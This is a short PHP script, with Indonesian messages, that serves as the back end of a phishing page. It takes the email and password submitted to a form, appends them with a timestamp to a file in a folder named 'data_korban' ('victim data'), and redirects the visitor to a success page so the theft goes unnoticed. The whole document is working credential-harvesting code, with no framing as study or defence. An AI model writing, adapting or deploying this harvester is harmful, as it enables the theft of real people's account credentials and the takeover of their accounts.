<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? 'undefined';
    $password = $_POST['password'] ?? 'undefined';

    $folder = "data_korban";
    $filepath = $folder . "/hasil.txt";

    if (!file_exists($folder)) {
        if (!mkdir($folder, 0755, true)) {
            die("Gagal membuat folder data_korban");
        }
    }
    
    $file = fopen($filepath, "a");
    if ($file) {
        $waktu = date("Y-m-d H:i:s");
        fwrite($file, "[$waktu] Email: $email | Password: $password\n");
        fclose($file);
        header("Location: success.html");
        exit();
    } else {
        die("Gagal membuka file hasil.txt untuk ditulis");
    }
} else {
    echo "Akses tidak valid";
}
?>
